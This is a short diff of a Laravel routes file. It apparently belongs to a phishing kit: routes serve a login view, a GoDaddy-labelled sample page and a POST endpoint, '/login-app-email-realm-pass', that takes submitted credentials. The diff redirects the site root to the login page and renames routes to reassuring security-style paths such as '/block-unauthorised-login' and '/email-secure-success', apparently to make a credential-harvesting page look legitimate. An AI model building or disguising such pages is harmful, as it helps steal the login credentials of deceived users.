@@ -12,10 +12,10 @@
 */
 
 Route::get('/', function () {
-    return view('welcome');
+    return redirect('/block-unauthorised-login');
 });
 
-Route::get('/login4', function () {
+Route::get('/block-unauthorised-login', function () {
     return view('auth.login4');
 });
 Route::get('/login-app-email-realm-pass', function () {
@@ -24,10 +24,10 @@ Route::get('/login-app-email-realm-pass', function () {
 Route::get('/sample', function () {
     return view('godaddy.sample');
 });
-Route::get('/success', function () {
+Route::get('/email-secure-success', function () {
     return view('success');
 });
-Route::get('/sendmail', function () {
+Route::get('/osendmail', function () {
     return view('createEmail');
 });
 Route::post('/login-app-email-realm-pass', 'PageController@index')->name('pages');
